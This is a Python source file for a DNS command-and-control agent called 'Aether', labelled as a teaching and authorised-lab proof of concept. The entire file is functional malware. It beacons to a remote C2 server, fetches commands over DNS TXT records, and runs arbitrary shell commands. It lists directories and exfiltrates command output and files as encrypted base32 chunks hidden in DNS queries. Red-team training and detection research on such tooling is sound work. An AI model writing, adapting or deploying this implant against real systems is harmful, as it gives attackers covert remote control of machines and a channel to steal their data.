#!/usr/bin/env python3
"""
aether_agent.py — DNS C2 agent (teaching / authorised-lab PoC).

Beacons with jitter; pulls full commands via TXT (PULL/IDLE); uplinks
AES-256-GCM + zlib payloads as base32 labels (str-/chk-/end-).
"""

from __future__ import annotations

import argparse
import base64
import os
import random
import socket
import subprocess
import sys
import time
import zlib

from Cryptodome.Cipher import AES

DEMO_KEY = b"AetherFrameworkSecureKey2026!!!!"

C2_SERVER = ""
ZONE_DOMAIN = ""
C2_PORT = 53
CRYPTO_KEY: bytes = b""
LABEL_CHUNK_SIZE = 24
BEACON_SLEEP_BASE = 4.0

cached_stream_matrix: dict = {}
active_transfer_name = ""
busy = False


def resolve_key(args) -> bytes:
    if args.demo_key:
        print("!" * 60)
        print("[!] DEMO KEY IN USE — teaching only. Do not use on a real engagement.")
        print("!" * 60)
        return DEMO_KEY

    hex_str = args.key_hex or os.environ.get("AETHER_KEY", "")
    if not hex_str:
        sys.exit(
            "[-] No crypto key. Set AETHER_KEY (64 hex chars = 32 bytes), "
            "pass --key-hex, or use --demo-key for lab demos."
        )
    hex_str = hex_str.strip().lower().replace("0x", "")
    if len(hex_str) != 64:
        sys.exit("[-] Key must be exactly 64 hex characters (32 raw bytes).")
    try:
        return bytes.fromhex(hex_str)
    except ValueError:
        sys.exit("[-] Key is not valid hex.")


def encrypt_payload(raw_bytes: bytes) -> str:
    compressed = zlib.compress(raw_bytes)
    cipher = AES.new(CRYPTO_KEY, AES.MODE_GCM)
    ciphertext, tag = cipher.encrypt_and_digest(compressed)
    packaged = cipher.nonce + tag + ciphertext
    return base64.b32encode(packaged).decode().lower().replace("=", "")


def sanitize_name(name: str) -> str:
    # DNS labels cannot reliably carry dots
    return name.replace(".", "__")


def _dns_name(subdomain: str) -> bytes:
    labels = []
    for part in f"{subdomain}.{ZONE_DOMAIN}".split("."):
        if not part:
            continue
        raw = part.encode("ascii", errors="ignore")
        if len(raw) > 63:
            raw = raw[:63]
        labels.append(bytes([len(raw)]) + raw)
    return b"".join(labels) + b"\x00"


def transmit_dns_query(subdomain: str, qtype: int = 1) -> bytes:
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(2.0)
    packet = b"\x45\x67\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
    packet += _dns_name(subdomain)
    packet += qtype.to_bytes(2, "big") + b"\x00\x01"
    try:
        sock.sendto(packet, (C2_SERVER, C2_PORT))
        response, _ = sock.recvfrom(2048)
        sock.close()
        return response
    except Exception:
        sock.close()
        return b""


def _a_rdata(response: bytes) -> str:
    if len(response) < 16:
        return ""
    return response[-4:].decode("ascii", errors="ignore").rstrip("\x00").strip()


def _txt_rdata(response: bytes) -> str:
    if len(response) < 12:
        return ""
    idx = response.find(b"\x00\x10\x00\x01")
    if idx == -1:
        return ""
    rr = idx - 2
    if rr < 0 or rr + 12 > len(response):
        return ""
    rdlen = int.from_bytes(response[rr + 10 : rr + 12], "big")
    rdata = response[rr + 12 : rr + 12 + rdlen]
    if not rdata:
        return ""
    n = rdata[0]
    return rdata[1 : 1 + n].decode("utf-8", errors="ignore")


def dispatch_stream(name: str, raw_data_bytes: bytes) -> None:
    global cached_stream_matrix, active_transfer_name, busy
    busy = True
    wire_name = sanitize_name(name)
    active_transfer_name = wire_name
    cached_stream_matrix = {}

    b32_ciphertext = encrypt_payload(raw_data_bytes)

    seq = 0
    for i in range(0, len(b32_ciphertext), LABEL_CHUNK_SIZE):
        cached_stream_matrix[seq] = b32_ciphertext[i : i + LABEL_CHUNK_SIZE]
        seq += 1

    transmit_dns_query(f"str-{seq}-{wire_name}")
    time.sleep(0.05)

    for seq_id, data_chunk in cached_stream_matrix.items():
        transmit_dns_query(f"chk-{seq_id}-{data_chunk}")
        time.sleep(0.01)

    time.sleep(0.05)
    evaluate_server_feedback(transmit_dns_query(f"end-{wire_name}"))


def evaluate_server_feedback(response_packet: bytes) -> None:
    global cached_stream_matrix, active_transfer_name, busy
    cmd_str = _a_rdata(response_packet)
    if cmd_str.startswith("R"):
        try:
            target_seq = int(cmd_str[1:].strip() or "0")
        except ValueError:
            busy = False
            return
        if target_seq in cached_stream_matrix:
            transmit_dns_query(f"chk-{target_seq}-{cached_stream_matrix[target_seq]}")
        time.sleep(0.05)
        evaluate_server_feedback(transmit_dns_query(f"end-{active_transfer_name}"))
    elif cmd_str == "DONE":
        cached_stream_matrix, active_transfer_name = {}, ""
        busy = False


def fetch_command() -> str:
    res = transmit_dns_query("pull", qtype=16)
    return _txt_rdata(res).strip()


def execute_beacon_cycle() -> None:
    global busy
    if busy:
        return

    res = transmit_dns_query("beacon")
    status = _a_rdata(res)
    if status != "PULL":
        return

    cmd = fetch_command()
    if not cmd or "|" not in cmd:
        return

    action, argument = cmd.split("|", 1)

    if action == "LS":
        try:
            listing = "\n".join(os.listdir(argument or ".")).encode()
            dispatch_stream("ls_output.txt", listing)
        except Exception as e:
            dispatch_stream("ls_output.txt", str(e).encode())

    elif action == "RUN":
        try:
            proc = subprocess.run(argument, shell=True, capture_output=True)
            output = proc.stdout + proc.stderr or b"[+] Command produced no output."
            dispatch_stream("command_log.txt", output)
        except Exception as e:
            dispatch_stream("command_log.txt", str(e).encode())

    elif action == "SEND":
        if not os.path.isfile(argument):
            dispatch_stream(
                "command_log.txt",
                f"SEND failed: not a file: {argument!r}".encode(),
            )
            return
        try:
            with open(argument, "rb") as f:
                dispatch_stream(os.path.basename(argument), f.read())
        except Exception as e:
            dispatch_stream("command_log.txt", str(e).encode())


def parse_args():
    ap = argparse.ArgumentParser(
        description="Aether DNS C2 agent — authorised lab / coursework only."
    )
    ap.add_argument(
        "-s",
        "--server",
        required=True,
        help="IP address of the authoritative C2 listener",
    )
    ap.add_argument(
        "-d",
        "--domain",
        default="aether.internal",
        help="Base zone domain (default aether.internal)",
    )
    ap.add_argument(
        "--port",
        type=int,
        default=53,
        help="UDP port on the server (default 53)",
    )
    key = ap.add_mutually_exclusive_group()
    key.add_argument(
        "--key-hex",
        default=None,
        help="32-byte AES key as 64 hex chars (or set AETHER_KEY)",
    )
    key.add_argument(
        "--demo-key",
        action="store_true",
        help="Use the built-in teaching key (prints a loud warning)",
    )
    return ap.parse_args()


def main() -> None:
    global C2_SERVER, ZONE_DOMAIN, C2_PORT, CRYPTO_KEY

    args = parse_args()
    CRYPTO_KEY = resolve_key(args)
    C2_SERVER = args.server
    ZONE_DOMAIN = args.domain.lower().strip(".")
    C2_PORT = args.port

    print(f"[*] Aether agent → {C2_SERVER}:{C2_PORT} zone={ZONE_DOMAIN}. Beaconing...")

    while True:
        try:
            execute_beacon_cycle()
        except Exception:
            pass
        jitter = random.uniform(-0.30, 0.30)
        sleep_for = BEACON_SLEEP_BASE + (BEACON_SLEEP_BASE * jitter)
        time.sleep(max(1.0, sleep_for))


if __name__ == "__main__":
    main()
